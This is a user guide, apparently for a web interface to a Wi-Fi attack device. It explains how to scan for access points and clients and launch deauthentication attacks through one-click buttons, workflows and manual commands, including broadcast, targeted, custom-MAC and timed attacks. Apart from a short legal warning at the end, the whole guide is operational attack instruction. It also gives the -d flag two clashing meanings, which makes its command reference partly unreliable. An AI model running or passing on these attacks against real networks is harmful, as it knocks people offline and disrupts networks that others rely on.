# Deauth Attack Guide

## Quick Start - Using the UI

### Method 1: One-Click Deauth (Easiest)
1. Connect your device (click "Connect" in header)
2. Scan for access points: Click "Scan AP" button
3. Wait for APs to appear in the table
4. Click the **"Deauth"** button next to any AP in the table
   - This automatically selects the AP and starts deauth attack

### Method 2: Using Workflows (Recommended)
1. Connect your device
2. Click "Scan AP" to find targets
3. Open the **"Deauthentication Flood"** workflow from the left sidebar
4. Enter the AP index numbers (comma-separated, e.g., `0,1,2`)
5. Click "Execute Workflow"

### Method 3: Manual Commands
Type these commands in the custom command box:

```bash
# 1. Scan for access points
scanap

# 2. List available APs (note the index numbers)
list -a

# 3. Select target AP(s) - use index from list
select -a 0

# 4. Launch deauth attack
attack -t deauth

# 5. Stop the attack
stopscan
```

## Advanced Deauth Options

### Targeted Deauth (Specific Clients)
Use the **"Targeted Deauthentication"** workflow:
1. Scan APs: `scanap`
2. Select AP: `select -a 0`
3. Scan stations: `scansta`
4. Select specific clients: `select -c 0,1,2`
5. Attack: `attack -t deauth -c`

### Manual Deauth (Custom MAC Addresses)
Use the **"Manual Deauthentication"** workflow or command:
```bash
attack -t deauth -s 00:11:22:33:44:55 -d ff:ff:ff:ff:ff:ff
```
- `-s` = source MAC (AP)
- `-d` = destination MAC (client, or ff:ff:ff:ff:ff:ff for broadcast)

### Timed Deauth
```bash
attack -t deauth -d 30
```
- `-d 30` = run for 30 seconds then stop automatically

## Available Workflows

### Deauthentication Flood
Broadcasts deauth frames to all clients of selected APs.

### Targeted Deauthentication
Targets specific stations connected to selected APs.

### Manual Deauthentication
Manually specify source and destination MAC addresses.

## Tips

- **Stop any attack**: Click "Stop" button or type `stopscan`
- **Select multiple APs**: Use comma-separated indices: `select -a 0,1,2`
- **Check selections**: Type `list -a` to see which APs are selected (marked with "selected")
- **Monitor results**: Watch the terminal output at the bottom for feedback

## Troubleshooting

### "No AP selected" error
- Make sure you ran `select -a <index>` before the attack
- Verify selection with `list -a` command

### Attack not working
1. Ensure device is connected (green status)
2. Make sure you scanned for APs first (`scanap`)
3. Verify AP is selected (`list -a` should show "selected")
4. Check your device firmware supports deauth attacks

### Device not connecting
- Close Arduino IDE, PlatformIO, or other serial monitors
- Try "Select New Port" button
- Use "Forget Port" then reconnect
- Unplug and replug your device

## Command Reference

| Command | Description |
|---------|-------------|
| `scanap` | Scan for access points |
| `scansta` | Scan for stations/clients |
| `list -a` | List all access points |
| `list -c` | List all stations |
| `select -a <index>` | Select AP by index |
| `select -c <index>` | Select station by index |
| `attack -t deauth` | Start deauth attack on selected APs |
| `attack -t deauth -c` | Deauth selected stations only |
| `attack -t deauth -d <seconds>` | Timed deauth attack |
| `stopscan` | Stop all attacks/scans |

## Legal Notice

⚠️ **WARNING**: Deauthentication attacks may be illegal in your jurisdiction. Only use on networks you own or have explicit permission to test. Unauthorized access to computer networks is a crime in most countries.
